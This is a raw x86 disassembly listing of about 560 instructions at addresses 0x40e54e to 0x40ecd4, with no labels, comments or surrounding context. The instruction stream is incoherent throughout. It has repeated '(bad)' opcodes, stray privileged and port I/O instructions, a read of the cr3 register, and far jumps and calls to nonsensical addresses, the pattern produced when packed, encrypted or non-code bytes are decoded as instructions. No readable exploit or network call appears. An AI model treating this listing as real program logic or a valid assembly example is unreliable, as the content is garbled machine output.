  40e54e:	les    ebx,FWORD PTR [esi-0x6d]
  40e551:	lahf   
  40e552:	inc    eax
  40e553:	add    BYTE PTR es:[edi-0x609e2091],ch
  40e55a:	mov    DWORD PTR [ebx+0xd9733a2],esi
  40e560:	and    eax,0x48364780
  40e565:	aaa    
  40e566:	retf   0xc0b1
  40e569:	cmc    
  40e56a:	dec    esi
  40e56b:	jb     0x40e583
  40e56d:	dec    esi
  40e56e:	sub    dh,ah
  40e570:	dec    edx
  40e571:	adc    cl,BYTE PTR [esp+edx*8-0x18]
  40e575:	pop    ebp
  40e576:	frstor [ebx+0x3]
  40e579:	lods   al,BYTE PTR ds:[esi]
  40e57a:	dec    edx
  40e57b:	jecxz  0x40e580
  40e57d:	aad    0xf7
  40e57f:	pop    esi
  40e580:	inc    esi
  40e581:	xor    al,al
  40e583:	xchg   esp,eax
  40e584:	or     BYTE PTR [edx-0x28],0xa9
  40e588:	ret    
  40e589:	pop    edx
  40e58a:	cmp    eax,0x202e995c
  40e58f:	test   al,0x33
  40e591:	jmp    0xc415f099
  40e596:	pushf  
  40e597:	mov    BYTE PTR [esi+eax*8],dl
  40e59a:	iret   
  40e59b:	jae    0x40e5fb
  40e59d:	sub    al,0x70
  40e59f:	je     0x40e5df
  40e5a1:	dec    esp
  40e5a2:	sbb    esp,DWORD PTR [edi]
  40e5a4:	mov    al,ds:0x120352a7
  40e5a9:	push   di
  40e5ab:	outs   dx,BYTE PTR ds:[esi]
  40e5ac:	inc    ebp
  40e5ad:	test   eax,0x4ee66b9d
  40e5b2:	mov    esi,0xf98f38b2
  40e5b7:	iret   
  40e5b8:	sahf   
  40e5b9:	jecxz  0x40e5f5
  40e5bb:	jbe    0x40e635
  40e5bd:	(bad)  
  40e5be:	cmp    al,0xf8
  40e5c0:	loopne 0x40e5f0
  40e5c2:	xor    ebx,ecx
  40e5c4:	and    DWORD PTR [edi+0x3d],ebp
  40e5c7:	es mov ch,ch
  40e5ca:	inc    eax
  40e5cb:	and    BYTE PTR [eax+0x62],bl
  40e5ce:	and    eax,DWORD PTR [ecx-0x2f]
  40e5d1:	lea    edi,[ebx+0x14db75d5]
  40e5d7:	scas   eax,DWORD PTR es:[edi]
  40e5d8:	inc    eax
  40e5d9:	les    ecx,FWORD PTR [ecx+0x6f663ac3]
  40e5df:	inc    BYTE PTR ds:0x75f75c86
  40e5e5:	in     eax,0x4d
  40e5e7:	shr    ecx,1
  40e5e9:	sub    DWORD PTR [ecx-0x6588216f],eax
  40e5ef:	jl     0x40e5df
  40e5f1:	pop    ebp
  40e5f2:	inc    esp
  40e5f3:	dec    edx
  40e5f4:	call   0x69b7830e
  40e5f9:	push   ss
  40e5fa:	ds push 0xc1a8813c
  40e600:	cmp    esp,DWORD PTR [ecx+eax*4]
  40e603:	push   cs
  40e604:	or     DWORD PTR [edx-0x21ac7d29],edx
  40e60a:	data16 std 
  40e60c:	arpl   WORD PTR [ebx],dx
  40e60e:	xlat   BYTE PTR ds:[ebx]
  40e60f:	pop    es
  40e610:	enter  0xe2f7,0x26
  40e614:	xchg   esp,eax
  40e615:	xor    ah,dl
  40e617:	in     eax,dx
  40e618:	popf   
  40e619:	repz pop ds
  40e61b:	inc    ebx
  40e61c:	sbb    edi,DWORD PTR [esi+0x1]
  40e61f:	push   ebx
  40e621:	push   ss
  40e622:	test   DWORD PTR [eax],ebx
  40e624:	ret    0x2d38
  40e627:	mov    ebp,0x44231cc9
  40e62c:	addr16 js 0x40e644
  40e62f:	jg     0x40e609
  40e631:	adc    DWORD PTR [esi-0x3d],esi
  40e634:	mov    dh,0x49
  40e636:	add    DWORD PTR [edi-0xcbdd204],edx
  40e63c:	adc    BYTE PTR [edi+0x69],0x42
  40e640:	nop
  40e641:	loope  0x40e6a4
  40e643:	cwde   
  40e644:	xchg   edi,eax
  40e645:	inc    eax
  40e646:	icebp  
  40e647:	imul   eax,DWORD PTR [eax],0xe87f82f
  40e64d:	pop    DWORD PTR [esi]
  40e64f:	jne    0x40e5f1
  40e651:	xchg   esi,eax
  40e652:	or     eax,0xd0d58b5c
  40e657:	test   DWORD PTR [eax],ebp
  40e659:	cld    
  40e65a:	std    
  40e65b:	shr    DWORD PTR [ecx],0x15
  40e65e:	sub    DWORD PTR [eax],ecx
  40e660:	loop   0x40e6ce
  40e662:	mov    ebx,0xd2852011
  40e667:	ds inc ecx
  40e669:	ds pushf 
  40e66b:	jg     0x40e67a
  40e66d:	dec    ecx
  40e66e:	js     0x40e657
  40e670:	lods   eax,DWORD PTR ds:[esi]
  40e671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e672:	or     dh,BYTE PTR [ecx+0x5966c0d7]
  40e678:	add    bh,BYTE PTR ds:0x6071de01
  40e67e:	mov    eax,ds:0x7aaf352e
  40e683:	test   eax,0xca750235
  40e688:	test   DWORD PTR [ecx+0xd],0x9d4020c7
  40e68f:	outs   dx,BYTE PTR ds:[esi]
  40e690:	mov    bh,0x62
  40e692:	sahf   
  40e693:	xor    ah,ch
  40e695:	xchg   DWORD PTR [ecx],ebx
  40e697:	xchg   edx,eax
  40e698:	repnz stc 
  40e69a:	fadd   QWORD PTR [edi]
  40e69c:	sub    edi,DWORD PTR [edx+0x23112cad]
  40e6a2:	cli    
  40e6a3:	out    dx,eax
  40e6a4:	test   DWORD PTR ds:0x45c17880,esi
  40e6aa:	test   DWORD PTR [ebx+0x66],esi
  40e6ad:	jb     0x40e685
  40e6af:	jnp    0x40e64d
  40e6b1:	fs or  dh,bh
  40e6b4:	sti    
  40e6b5:	retf   0x8cdb
  40e6b8:	mov    ebp,0x2352d4be
  40e6bd:	xchg   BYTE PTR [ebp+0x6b],ch
  40e6c0:	stos   DWORD PTR es:[edi],eax
  40e6c1:	sbb    esi,edi
  40e6c3:	and    al,0x9c
  40e6c5:	cli    
  40e6c6:	adc    ecx,eax
  40e6c8:	push   eax
  40e6c9:	add    eax,0x48e1e791
  40e6ce:	ret    0xe25
  40e6d1:	js     0x40e6b4
  40e6d3:	sub    eax,0x2ffadca5
  40e6d8:	pop    eax
  40e6d9:	ja     0x40e704
  40e6db:	and    eax,0x1a6b7615
  40e6e0:	mov    ecx,cr3
  40e6e3:	aad    0x3c
  40e6e5:	dec    ecx
  40e6e6:	sahf   
  40e6e7:	push   eax
  40e6e8:	imul   edx,DWORD PTR [ebx+0xa28e259],0x51
  40e6ef:	xor    cl,BYTE PTR [edx+0x55]
  40e6f2:	dec    eax
  40e6f3:	fnstsw WORD PTR [ebp+esi*1-0x379cb9e9]
  40e6fa:	push   edi
  40e6fb:	das    
  40e6fc:	inc    ecx
  40e6fd:	mov    ebx,DWORD PTR [edi-0x218142ae]
  40e703:	xchg   ebp,eax
  40e704:	add    ecx,eax
  40e706:	lahf   
  40e707:	jp     0x40e776
  40e709:	nop
  40e70a:	mov    BYTE PTR [bp+0x2],bl
  40e70e:	call   0xc16fd274
  40e713:	imul   esp,DWORD PTR [edi],0x135c73a8
  40e719:	sbb    DWORD PTR [edi-0x43a4e822],0x8c244162
  40e723:	cmp    BYTE PTR [ebp-0x30],dl
  40e726:	and    al,0x85
  40e728:	ja     0x40e6bd
  40e72a:	xor    ebp,DWORD PTR [ebp+0x91ee1ec]
  40e730:	dec    edi
  40e731:	jge    0x40e71e
  40e733:	fxrstor [eax-0x15]
  40e737:	sbb    esi,eax
  40e739:	push   ebx
  40e73a:	mov    bh,BYTE PTR [edi+eiz*8+0xb70a6df]
  40e741:	cmp    BYTE PTR [ebx],0x92
  40e744:	cmp    al,0x6c
  40e746:	inc    ebp
  40e747:	and    ebx,DWORD PTR [edx+0x68bd90d9]
  40e74d:	hlt    
  40e74e:	mov    esp,0x4e68597e
  40e753:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e754:	ss inc ebp
  40e756:	fidiv  WORD PTR [esi+0x12b6584d]
  40e75c:	sbb    ecx,eax
  40e75e:	jmp    0x9e9b:0x1cbef040
  40e765:	mov    dh,0xe4
  40e767:	mov    ah,dh
  40e769:	xchg   esi,eax
  40e76a:	lock pushf 
  40e76c:	gs mov edx,0x5fc7ec6f
  40e772:	ins    DWORD PTR es:[edi],dx
  40e773:	inc    ebx
  40e774:	test   BYTE PTR [esi+0x6e1c8a07],bh
  40e77a:	sub    al,0x22
  40e77c:	shl    BYTE PTR [edx-0x4884f607],1
  40e782:	pop    esp
  40e783:	push   esi
  40e784:	dec    eax
  40e785:	add    esp,DWORD PTR [esi-0x16]
  40e788:	fwait
  40e789:	lods   eax,DWORD PTR ds:[esi]
  40e78a:	cli    
  40e78b:	jb     0x40e767
  40e78d:	cld    
  40e78e:	jge    0x40e724
  40e790:	and    bh,dl
  40e792:	das    
  40e793:	pop    ecx
  40e794:	hlt    
  40e795:	pop    edi
  40e796:	inc    ebp
  40e797:	xchg   ecx,eax
  40e798:	and    eax,0xe22cb98a
  40e79d:	fcmovne st,st(5)
  40e79f:	pop    edx
  40e7a0:	xchg   esi,eax
  40e7a1:	mov    edx,0x303a382b
  40e7a6:	push   esp
  40e7a7:	dec    edx
  40e7a8:	fst    DWORD PTR [ecx+0x6a5575b4]
  40e7ae:	stos   BYTE PTR es:[edi],al
  40e7af:	out    0x5,eax
  40e7b1:	(bad)  
  40e7b2:	cdq    
  40e7b3:	retf   0x3bb2
  40e7b6:	add    eax,0xe88a808f
  40e7bb:	sbb    ah,BYTE PTR [ecx-0x4fd8cbc2]
  40e7c1:	inc    esp
  40e7c2:	mov    ebp,0xd0eb8a66
  40e7c7:	xchg   BYTE PTR [ebx-0x31],cl
  40e7ca:	sbb    BYTE PTR [edi+0x3dedadec],0xab
  40e7d1:	leave  
  40e7d2:	jle    0x40e795
  40e7d4:	aad    0x8f
  40e7d6:	nop
  40e7d7:	pushf  
  40e7d8:	rcr    bh,1
  40e7da:	xchg   esp,eax
  40e7db:	mov    eax,0x94d41005
  40e7e0:	fs hlt 
  40e7e2:	jge    0x40e7d9
  40e7e4:	xor    eax,0xb2b1a3dd
  40e7e9:	adc    al,0x6a
  40e7eb:	add    eax,0xac17f430
  40e7f0:	js     0x40e7e3
  40e7f2:	mov    BYTE PTR [esi+0x25],bl
  40e7f5:	dec    edi
  40e7f6:	push   0x62331fb
  40e7fb:	ror    DWORD PTR [ecx-0x76db3f49],0xd
  40e802:	xor    BYTE PTR [ebx],al
  40e804:	hlt    
  40e805:	ins    DWORD PTR es:[edi],dx
  40e806:	data16 data16 es into 
  40e80a:	ds js  0x40e881
  40e80d:	call   0x79b3:0x6ac6fff3
  40e814:	xchg   esi,eax
  40e815:	cld    
  40e816:	(bad)  
  40e817:	(bad)
  40e81a:	(bad)  
  40e81b:	jmp    0x40e7aa
  40e81d:	out    dx,al
  40e81e:	call   0x808d0dfb
  40e823:	xchg   esi,eax
  40e824:	xor    bl,bl
  40e826:	into   
  40e827:	outs   dx,DWORD PTR ds:[esi]
  40e828:	xchg   esi,eax
  40e829:	sub    BYTE PTR [edi+0x0],ch
  40e82c:	cmp    BYTE PTR [ebx+0x14],ch
  40e82f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e830:	bound  edx,QWORD PTR [ebp-0x7fac834d]
  40e836:	sti    
  40e837:	ds stc 
  40e839:	sbb    al,0x4b
  40e83b:	and    ch,BYTE PTR [ebx]
  40e83d:	add    BYTE PTR [esi+0x32f42e05],0x65
  40e844:	push   edx
  40e845:	clc    
  40e846:	push   es
  40e847:	test   BYTE PTR [ebx+0xc],ch
  40e84a:	and    edi,DWORD PTR [ebp-0x72081e4e]
  40e850:	inc    edi
  40e851:	add    eax,0x279add4e
  40e856:	jns    0x40e807
  40e858:	mov    bh,0xa3
  40e85a:	js     0x40e82d
  40e85c:	lahf   
  40e85d:	sub    esi,DWORD PTR [ebx+0x7f]
  40e860:	or     eax,0x69a1d97a
  40e865:	(bad)  
  40e866:	call   0x870cac6c
  40e86b:	adc    dl,BYTE PTR [eax]
  40e86d:	mov    BYTE PTR [esi-0x6053e30a],al
  40e873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e874:	dec    edx
  40e875:	popf   
  40e876:	scas   al,BYTE PTR es:[edi]
  40e877:	pusha  
  40e878:	mov    dl,ch
  40e87a:	jg     0x40e874
  40e87c:	mov    esp,0xc44da78c
  40e881:	xchg   edi,eax
  40e882:	sub    BYTE PTR ds:0xf4c83875,0x7e
  40e889:	gs fcmovnbe st,st(6)
  40e88c:	or     si,WORD PTR [edi+0x64bb8832]
  40e893:	je     0x40e826
  40e895:	iret   
  40e896:	cmp    ah,BYTE PTR [esi]
  40e898:	jns    0x40e87f
  40e89a:	fs je  0x40e889
  40e89d:	push   ss
  40e89e:	nop
  40e89f:	adc    eax,0x9a299858
  40e8a4:	add    bl,0x3e
  40e8a7:	mov    edx,0xaaec22c3
  40e8ac:	or     al,al
  40e8ae:	mov    bl,0x2c
  40e8b0:	jmp    0x20689406
  40e8b5:	(bad)  
  40e8b6:	fadd   st,st(6)
  40e8b8:	ror    ch,1
  40e8ba:	push   edi
  40e8bb:	sti    
  40e8bc:	push   ebx
  40e8bd:	div    BYTE PTR [ecx]
  40e8bf:	dec    eax
  40e8c0:	sbb    dh,BYTE PTR [edx+0x14]
  40e8c3:	xlat   BYTE PTR ds:[ebx]
  40e8c4:	cld    
  40e8c5:	jle    0x40e900
  40e8c7:	cs daa 
  40e8c9:	pop    ds
  40e8ca:	ins    BYTE PTR es:[edi],dx
  40e8cb:	fld    QWORD PTR [ecx+0x3c]
  40e8ce:	cmp    BYTE PTR [eax-0x42],ch
  40e8d1:	pop    eax
  40e8d2:	fdiv   st,st(6)
  40e8d4:	inc    ebx
  40e8d5:	clc    
  40e8d6:	cwde   
  40e8d7:	mov    esp,0xe33c58b7
  40e8dc:	add    eax,0xfa582c80
  40e8e1:	xchg   edx,eax
  40e8e2:	cs pushf 
  40e8e4:	push   edx
  40e8e5:	xor    BYTE PTR [ecx],dh
  40e8e7:	not    BYTE PTR [ebp+0x66]
  40e8ea:	add    al,0x5e
  40e8ec:	mul    ch
  40e8ee:	sbb    eax,0x20132969
  40e8f3:	xor    eax,0x3d870824
  40e8f8:	add    cl,BYTE PTR ds:0xc6c1a398
  40e8fe:	inc    edi
  40e8ff:	nop
  40e900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e901:	fyl2xp1 
  40e903:	push   eax
  40e904:	sbb    al,0xab
  40e906:	repz int3 
  40e908:	adc    eax,0x40e86680
  40e90d:	push   0xffffffd5
  40e90f:	repnz mov ch,0xa8
  40e912:	sub    al,0xdf
  40e914:	mov    esi,0xa89d3e34
  40e919:	mov    ds:0xf1dedfef,al
  40e91e:	test   al,0xe6
  40e920:	sub    edi,edi
  40e922:	add    ch,ah
  40e924:	sti    
  40e925:	inc    esp
  40e926:	mov    bl,dl
  40e928:	add    BYTE PTR [edx-0x6c],bh
  40e92b:	mov    edx,0x4a736172
  40e930:	and    eax,0xb7063db7
  40e935:	test   al,0xb7
  40e937:	push   0xffffffb0
  40e939:	cdq    
  40e93a:	adc    ch,BYTE PTR [ebx-0x4243698c]
  40e940:	movaps xmm6,xmm7
  40e943:	xchg   edx,eax
  40e944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e945:	es test eax,0xe7e17211
  40e94b:	sub    BYTE PTR [esi-0x7e],0x8e
  40e94f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e950:	popa   
  40e951:	push   es
  40e952:	or     al,0x4
  40e954:	call   0xf588e584
  40e959:	mov    bl,0x84
  40e95b:	rol    BYTE PTR [ebx+edx*2+0x56b47936],cl
  40e962:	sbb    edi,DWORD PTR [ebx+0x12]
  40e965:	cmp    al,0x31
  40e967:	cmp    al,0xb4
  40e969:	out    dx,eax
  40e96a:	jg     0x40e9b0
  40e96c:	push   ebp
  40e96d:	mov    ch,BYTE PTR [edx]
  40e96f:	aas    
  40e970:	sub    BYTE PTR [ebx-0x1aba06a0],dl
  40e976:	mov    bh,0x6
  40e978:	loope  0x40e977
  40e97a:	or     eax,0xf76407fa
  40e97f:	jo     0x40e9b4
  40e981:	jno    0x40e9fb
  40e983:	push   ebx
  40e984:	dec    ebp
  40e985:	jle    0x40e9b6
  40e987:	fidivr WORD PTR [ebx+0x5a6217b6]
  40e98d:	psllw  mm5,QWORD PTR [eax]
  40e990:	mov    BYTE PTR [eax],ch
  40e992:	leave  
  40e993:	dec    ecx
  40e994:	push   eax
  40e995:	fwait
  40e996:	inc    ebx
  40e997:	mov    al,ds:0xe647a4e2
  40e99c:	(bad)  
  40e99e:	xchg   esi,eax
  40e99f:	jmp    0x40e92f
  40e9a1:	sub    eax,0x393bef43
  40e9a6:	mov    ah,0xf5
  40e9a8:	or     dh,BYTE PTR [esi]
  40e9aa:	xchg   edi,eax
  40e9ab:	fstp   DWORD PTR [edi+esi*2+0x77063f]
  40e9b2:	retf   
  40e9b3:	inc    ebp
  40e9b4:	or     dh,al
  40e9b6:	xchg   ecx,eax
  40e9b7:	xor    ah,bl
  40e9b9:	xchg   ebx,eax
  40e9ba:	push   0x70
  40e9bc:	jge    0x40e9dc
  40e9be:	in     eax,0x60
  40e9c0:	inc    eax
  40e9c1:	pop    ss
  40e9c2:	sbb    edi,DWORD PTR [ebx]
  40e9c4:	pop    es
  40e9c5:	dec    eax
  40e9c6:	sub    ch,dh
  40e9c8:	sbb    ecx,esi
  40e9ca:	mov    edi,0x77cebab
  40e9cf:	dec    edx
  40e9d0:	push   es
  40e9d1:	jp     0x40e9ed
  40e9d3:	dec    DWORD PTR [ebx+esi*2]
  40e9d6:	jns    0x40e99d
  40e9d8:	sub    DWORD PTR [edi-0x2fe28cd4],0x5ff1262
  40e9e2:	inc    ecx
  40e9e3:	jb     0x40ea38
  40e9e5:	or     DWORD PTR [ecx-0x55ca770],ecx
  40e9eb:	dec    ebp
  40e9ec:	pop    es
  40e9ed:	or     al,BYTE PTR [ecx+0x1ea2ff51]
  40e9f3:	pop    ebp
  40e9f4:	inc    edx
  40e9f5:	out    0xf2,al
  40e9f7:	in     eax,0xd9
  40e9f9:	xchg   edx,eax
  40e9fa:	mov    edx,edi
  40e9fc:	mov    edi,0x25b20b4a
  40ea01:	mov    BYTE PTR [eax+0x2e97e815],0x46
  40ea08:	mov    ah,0xb3
  40ea0a:	cmp    eax,0xae843922
  40ea0f:	ret    
  40ea10:	arpl   WORD PTR [ebx],si
  40ea12:	jbe    0x40e9d7
  40ea14:	cmp    eax,0x8ea14679
  40ea19:	sbb    ch,BYTE PTR [edx+0x12]
  40ea1c:	leave  
  40ea1d:	sar    bh,cl
  40ea1f:	test   al,0x7b
  40ea21:	aaa    
  40ea22:	outs   dx,BYTE PTR ds:[esi]
  40ea23:	std    
  40ea24:	(bad)  
  40ea25:	into   
  40ea26:	fst    QWORD PTR [ebx-0x73]
  40ea29:	clc    
  40ea2a:	add    BYTE PTR [ebx],dl
  40ea2c:	addr16 std 
  40ea2e:	aaa    
  40ea2f:	fild   DWORD PTR [ebx+0x2955ca24]
  40ea35:	push   cs
  40ea36:	rcl    DWORD PTR [eax+0x5d],0x79
  40ea3a:	into   
  40ea3b:	add    cl,BYTE PTR [ecx-0x61]
  40ea3e:	jecxz  0x40e9c6
  40ea40:	push   cs
  40ea41:	cmp    cl,BYTE PTR ds:0x5266fe1f
  40ea47:	xchg   DWORD PTR [ebx],esi
  40ea49:	jmp    0x40e9d8
  40ea4b:	add    al,0xfc
  40ea4d:	fisub  WORD PTR [ecx]
  40ea4f:	ss mov eax,0x4f1985c3
  40ea55:	shr    BYTE PTR [esi],0x8
  40ea58:	hlt    
  40ea59:	push   cs
  40ea5a:	aaa    
  40ea5b:	mov    ds:0x43674c32,eax
  40ea60:	sbb    esp,edx
  40ea62:	mov    WORD PTR [edi+0xbb5f48a],cs
  40ea68:	popa   
  40ea69:	test   bl,ah
  40ea6b:	add    bh,BYTE PTR [eax+0x41]
  40ea6e:	daa    
  40ea6f:	jle    0x40ea03
  40ea71:	in     eax,0x81
  40ea73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea74:	call   0xd418b480
  40ea79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea7a:	push   0x48f99bb5
  40ea7f:	std    
  40ea80:	sar    DWORD PTR [esi-0x1b],1
  40ea83:	gs push es
  40ea85:	outs   dx,BYTE PTR ds:[esi]
  40ea86:	in     eax,0xa5
  40ea88:	into   
  40ea89:	clc    
  40ea8a:	mov    eax,ds:0xb96a643b
  40ea8f:	addr16 repz jo 0x40eaaf
  40ea93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea94:	push   0x79c55c7d
  40ea99:	pusha  
  40ea9a:	shl    ah,0x31
  40ea9d:	sub    eax,0x3669420f
  40eaa2:	je     0x40ea7b
  40eaa4:	fldcw  WORD PTR [ebx+0x4ecf0f60]
  40eaaa:	push   ebx
  40eaab:	test   DWORD PTR [eax+0x73],ebx
  40eaae:	addr16 jg 0x40ea9a
  40eab1:	dec    ebx
  40eab2:	lea    ebx,[ecx*2+0x498d29dc]
  40eab9:	mov    eax,0x167c69d8
  40eabe:	xchg   ebx,eax
  40eabf:	sub    al,0xb3
  40eac1:	test   eax,0x8f0eb88f
  40eac6:	cmp    ebp,eax
  40eac8:	rcl    DWORD PTR [ebp-0x605eab1b],1
  40eace:	xchg   ecx,eax
  40eacf:	rcl    BYTE PTR [edx],1
  40ead1:	jne    0x40ea9b
  40ead3:	xor    al,0x4d
  40ead5:	or     eax,0xc4919f7
  40eada:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eadb:	push   edx
  40eadc:	popf   
  40eadd:	bound  ecx,QWORD PTR [ebx-0x2f26998]
  40eae3:	mov    bh,0x14
  40eae5:	inc    ecx
  40eae6:	mov    edi,0xbdbf02b3
  40eaeb:	and    eax,0x5b0c2eb
  40eaf0:	test   DWORD PTR [edx+0x3],0x811f6c14
  40eaf7:	inc    ebp
  40eaf8:	adc    DWORD PTR [esi+ebp*8],edi
  40eafb:	cdq    
  40eafc:	xchg   edx,eax
  40eafd:	repz push ebx
  40eaff:	fmul   DWORD PTR [esi+0x51b39250]
  40eb05:	rcl    cl,cl
  40eb07:	scas   al,BYTE PTR es:[edi]
  40eb08:	pop    edx
  40eb09:	repz loop 0x40eb0e
  40eb0c:	mov    ecx,0x4920a828
  40eb11:	repz and BYTE PTR [ecx-0x212e8309],cl
  40eb18:	test   BYTE PTR [ebx-0x6e],dl
  40eb1b:	xor    DWORD PTR [edi],ebp
  40eb1d:	jae    0x40eb2d
  40eb1f:	fmul   st,st(6)
  40eb21:	lods   al,BYTE PTR ds:[esi]
  40eb22:	inc    esp
  40eb23:	loope  0x40eb02
  40eb25:	mov    BYTE PTR [edi-0x26],al
  40eb28:	int    0xa4
  40eb2a:	js     0x40eb82
  40eb2c:	or     BYTE PTR [ecx+0x71d3d57f],dl
  40eb32:	fisubr DWORD PTR [edx-0x75027a93]
  40eb38:	jno    0x40ead5
  40eb3a:	fs pop ebp
  40eb3c:	ins    BYTE PTR es:[edi],dx
  40eb3d:	xor    al,0x1f
  40eb3f:	pop    edx
  40eb40:	xor    eax,0x7b4badbe
  40eb45:	xchg   DWORD PTR [ecx-0x7a],edx
  40eb48:	sub    edx,ebx
  40eb4a:	and    al,0xea
  40eb4c:	pop    edx
  40eb4d:	jg     0x40ebb8
  40eb4f:	ins    BYTE PTR es:[edi],dx
  40eb50:	fild   WORD PTR [edx+edi*1-0x7d4a5899]
  40eb57:	ror    DWORD PTR [edx+0x542c952a],cl
  40eb5d:	stos   DWORD PTR es:[edi],eax
  40eb5e:	and    BYTE PTR [ebp+0x77],ch
  40eb61:	mov    al,0xce
  40eb63:	mov    cl,0xba
  40eb65:	dec    esi
  40eb66:	stc    
  40eb67:	pop    ebp
  40eb68:	call   0x46e2:0xd2e8bd8c
  40eb6f:	xchg   ecx,eax
  40eb70:	cmp    esp,eax
  40eb72:	dec    edx
  40eb73:	fsubr  DWORD PTR [ebx-0x5a]
  40eb76:	mov    esp,0x14558b66
  40eb7b:	aam    0x10
  40eb7d:	ins    DWORD PTR es:[edi],dx
  40eb7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb7f:	adc    dh,BYTE PTR ds:0xb5fbd940
  40eb85:	xor    dh,BYTE PTR [ebx]
  40eb87:	std    
  40eb88:	push   esi
  40eb89:	stos   DWORD PTR es:[edi],eax
  40eb8a:	jbe    0x40ebbb
  40eb8c:	mov    cl,0xf7
  40eb8e:	aam    0xd6
  40eb90:	inc    ebx
  40eb91:	(bad)  
  40eb92:	push   0x63
  40eb94:	sub    BYTE PTR [eax],dl
  40eb96:	push   ebp
  40eb97:	stos   DWORD PTR es:[edi],eax
  40eb98:	inc    edx
  40eb99:	xchg   esp,eax
  40eb9a:	icebp  
  40eb9b:	imul   esi,DWORD PTR [ecx+ebp*4],0x1e0cf59b
  40eba2:	mov    ds:0xd2ad2058,al
  40eba7:	pop    ebx
  40eba8:	sub    al,0x22
  40ebaa:	mov    DWORD PTR [ecx-0x35],ebp
  40ebad:	mov    al,ds:0x270dffd8
  40ebb2:	mov    dl,0x69
  40ebb4:	adc    BYTE PTR [edi+edx*4-0x37],al
  40ebb8:	jno    0x40eb92
  40ebba:	jno    0x40ec23
  40ebbc:	pop    es
  40ebbd:	mov    bh,0x8
  40ebbf:	ret    
  40ebc0:	sbb    esp,DWORD PTR [ebx+esi*2]
  40ebc3:	mov    al,ds:0xe202e6ad
  40ebc8:	sbb    bh,BYTE PTR [eax]
  40ebca:	pop    esp
  40ebcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebcc:	(bad)  
  40ebce:	ret    0x837e
  40ebd1:	aas    
  40ebd2:	mov    dl,0x52
  40ebd4:	xor    edi,ebp
  40ebd6:	push   ss
  40ebd7:	mov    ebx,0xef863f4b
  40ebdc:	pop    esp
  40ebdd:	mov    ebp,0x6465e770
  40ebe2:	pop    edx
  40ebe3:	push   ss
  40ebe4:	mov    ah,dl
  40ebe6:	call   0x21475f7a
  40ebeb:	fs mov esi,0xeb74697c
  40ebf1:	jge    0x40ebe5
  40ebf3:	mov    ebp,0xbf111c62
  40ebf8:	push   esp
  40ebf9:	xchg   DWORD PTR [edi],esp
  40ebfb:	test   DWORD PTR [ecx],esi
  40ebfd:	inc    ebx
  40ebfe:	adc    ecx,esi
  40ec00:	in     al,0xb3
  40ec02:	push   ebx
  40ec03:	ins    DWORD PTR es:[edi],dx
  40ec04:	ficomp DWORD PTR [esp+eiz*2-0x62]
  40ec08:	imul   eax,edx,0x32a5c70f
  40ec0e:	mov    dh,0xe6
  40ec10:	jmp    0x40ebba
  40ec12:	jmp    0x40ec3c
  40ec14:	ins    DWORD PTR es:[edi],dx
  40ec15:	(bad)
  40ec19:	adc    DWORD PTR [edi],ecx
  40ec1b:	jnp    0x40ebe5
  40ec1d:	or     dh,0x13
  40ec20:	aaa    
  40ec21:	and    DWORD PTR ds:0xb697fefe,ebx
  40ec27:	in     eax,0x36
  40ec29:	clc    
  40ec2a:	push   ss
  40ec2b:	nop
  40ec2c:	xor    ebp,DWORD PTR [esi+0x60]
  40ec2f:	inc    eax
  40ec30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec31:	cwde   
  40ec32:	mov    edx,0x676db183
  40ec37:	pop    DWORD PTR [edx+ebx*8+0x34]
  40ec3b:	push   0xffffff8f
  40ec3d:	adc    DWORD PTR [ebp+0x15b0b50c],0xd20d1ef8
  40ec47:	sbb    BYTE PTR [edx+0x12d1444c],ah
  40ec4d:	mov    edi,0x108e01f2
  40ec52:	push   ebx
  40ec53:	ret    
  40ec54:	cs pop ebp
  40ec56:	cli    
  40ec57:	xor    DWORD PTR [edi-0xc],edx
  40ec5a:	or     eax,0x1649229f
  40ec5f:	add    DWORD PTR [ecx],0x831d846f
  40ec65:	hlt    
  40ec66:	mov    gs,WORD PTR [edx-0x70f48d64]
  40ec6c:	pop    ebp
  40ec6d:	adc    al,BYTE PTR [edx-0x712b2dc6]
  40ec73:	das    
  40ec74:	sub    eax,0x941ab8f
  40ec79:	fadd   QWORD PTR [esi+0x23]
  40ec7c:	or     eax,0x884d5ddb
  40ec81:	scas   eax,DWORD PTR es:[edi]
  40ec82:	push   esp
  40ec83:	fdivp  st(5),st
  40ec85:	fisubr DWORD PTR [esi+0x2fd0ea7c]
  40ec8b:	ins    DWORD PTR es:[edi],dx
  40ec8c:	movaps XMMWORD PTR [ecx],xmm1
  40ec8f:	inc    edx
  40ec90:	test   DWORD PTR [esi-0x53],0x7217d95b
  40ec97:	lds    esp,FWORD PTR [ebp+ecx*2+0x7359b349]
  40ec9e:	sahf   
  40ec9f:	or     al,0xb8
  40eca1:	mov    eax,0x5d9c38e5
  40eca6:	scas   eax,DWORD PTR es:[edi]
  40eca7:	xor    BYTE PTR [ebx],bh
  40eca9:	jl     0x40ec8c
  40ecab:	lds    esp,FWORD PTR [esi]
  40ecad:	pand   mm6,QWORD PTR [edx]
  40ecb0:	ins    BYTE PTR es:[edi],dx
  40ecb1:	or     al,0x71
  40ecb3:	pop    ds
  40ecb4:	out    dx,eax
  40ecb5:	add    BYTE PTR [edi],cl
  40ecb7:	push   cs
  40ecb8:	jecxz  0x40ed28
  40ecba:	add    bh,BYTE PTR [ebx+0x2418c334]
  40ecc0:	fst    DWORD PTR [ecx]
  40ecc2:	or     bl,BYTE PTR [ebx+esi*2-0x464ae99d]
  40ecc9:	pop    edx
  40ecca:	mov    bh,BYTE PTR [ebp-0x2c8a8c10]
  40ecd0:	lds    ebp,FWORD PTR [ecx+ebx*2]
  40ecd3:	stc    
  40ecd4:	loopne 0x40ecc2
